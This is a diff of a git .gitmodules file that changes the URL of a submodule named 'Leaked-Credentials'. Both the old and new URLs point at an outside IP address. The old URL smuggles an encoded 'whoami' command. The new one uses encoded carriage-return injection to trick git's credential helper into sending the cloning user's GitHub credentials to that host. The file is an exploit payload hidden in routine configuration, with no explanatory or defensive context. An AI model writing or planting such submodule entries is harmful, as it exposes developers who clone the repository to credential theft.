@@ -1,3 +1,3 @@
 [submodule "Leaked-Credentials"]
 	path = Leaked-Credentials
-	url = http://github.com@207.244.255.245:7005/aaaa%3bwhoami%3b
+	url = http://%250dprotocol=https%250dhost=github.com%250d@207.244.255.245:7005/aaaaa
